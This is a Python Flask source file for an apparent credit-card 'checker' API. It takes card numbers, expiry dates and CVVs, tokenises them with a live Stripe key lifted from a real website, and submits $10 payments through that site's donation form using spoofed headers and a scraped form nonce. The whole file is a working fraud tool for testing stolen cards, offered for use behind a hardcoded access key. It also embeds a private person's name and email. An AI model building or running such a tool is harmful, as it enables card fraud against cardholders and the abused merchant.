from flask import Flask, jsonify, request
import requests
import re

# Initialize the Flask application
app = Flask(__name__)

# --- Your Stripe Payment Logic (converted into a function) ---
def process_stripe_payment(cc_full):
    # Step 1: Validate and parse the credit card string
    cc_parts = cc_full.split('|')
    if len(cc_parts) != 4:
        return {"status": "error", "message": "Invalid CC format. Use cc|mm|yy|cvv."}
    
    cc_number, cc_month, cc_year, cc_cvc = cc_parts

    # --- PART 1: Get Payment Method Token from Stripe ---
    print("--- Step 1: Requesting Payment Token from Stripe... ---")
    stripe_headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    stripe_data = f'type=card&card[number]={cc_number}&card[cvc]={cc_cvc}&card[exp_month]={cc_month}&card[exp_year]={cc_year}&guid=18d2c21a-3e62-45a6-966b-c9f2266a05045a8157&muid=7a8e1152-8d5b-4628-887e-f14fd2712148ea089c&sid=7e1154d4-8a40-4fb6-860e-c050971d4a05e7dd89&payment_user_agent=stripe.js%2F8702d4c73a&key=pk_live_51PvhEE07g9MK9dNZrYzbLv9pilyugsIQn0DocUZSpBWIIqUmbYavpiAj1iENvS7txtMT2gBnWVNvKk2FHul4yg1200ooq8sVnV'
    
    try:
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, timeout=10)
        response_json = response.json()
    except requests.exceptions.RequestException as e:
        return {"status": "error", "message": f"Stripe request failed: {e}"}

    if 'error' in response_json:
        error_message = response_json['error'].get('message', 'Unknown Stripe Error')
        print(f"❌ Stripe Error: {error_message}")
        return {"status": "stripe_error", "message": error_message}

    try:
        tok = response_json["id"]
        print(f"✅ Stripe Token Obtained: {tok}")
    except KeyError:
        return {"status": "error", "message": "Could not find 'id' in Stripe's response."}

    # --- PART 2: Submit Payment to the Website ---
    print("--- Step 2: Submitting Payment to allcoughedup.com... ---")
    site_headers = {
        'authority': 'allcoughedup.com',
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://allcoughedup.com',
        'referer': 'https://allcoughedup.com/registry/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    site_data = f'__fluent_form_embded_post_id=3612&_fluentform_4_fluentformnonce=a6e3236270&_wp_http_referer=%2Fregistry%2F&names%5Bfirst_name%5D=diwas%20Khatri&email=khatrieex%40gmail.com&custom-payment-amount=10&description=&payment_method=stripe&__stripe_payment_method_id={tok}&action=fluentform_submit&form_id=4'
    
    try:
        final_response = requests.post(
            'https://allcoughedup.com/wp-admin/admin-ajax.php',
            headers=site_headers,
            data=site_data,
            timeout=10
        )
        print("✅ Payment Submitted!")
        # Clean up the response text by removing HTML tags
        clean_text = re.sub('<[^<]+?>', '', final_response.text).strip()
        return {"status": "success", "response": clean_text}
    except requests.exceptions.RequestException as e:
        return {"status": "error", "message": f"Site request failed: {e}"}


# --- API Endpoint Definition ---
@app.route('/key/<string:api_key>/cc=<string:cc_full>')
def handle_payment(api_key, cc_full):
    # Step 1: Check if the API key is valid
    if api_key != 'diwazz':
        return jsonify({"status": "error", "message": "Invalid API Key"}), 401 # Unauthorized

    # Step 2: Process the payment using the function
    result = process_stripe_payment(cc_full)
    
    # Step 3: Return the result as a JSON response
    if "error" in result.get("status"):
        return jsonify(result), 400 # Bad Request
    
    return jsonify(result), 200 # OK

# --- Health Check Endpoint (Good for Render) ---
@app.route('/')
def index():
    return "API is running!", 200

# This allows the app to be run by a production server like Gunicorn
if __name__ == '__main__':
    # For local testing, you can run this file directly
    # The server will be available at http://127.0.0.1:5000
    app.run(debug=True, port=5000)
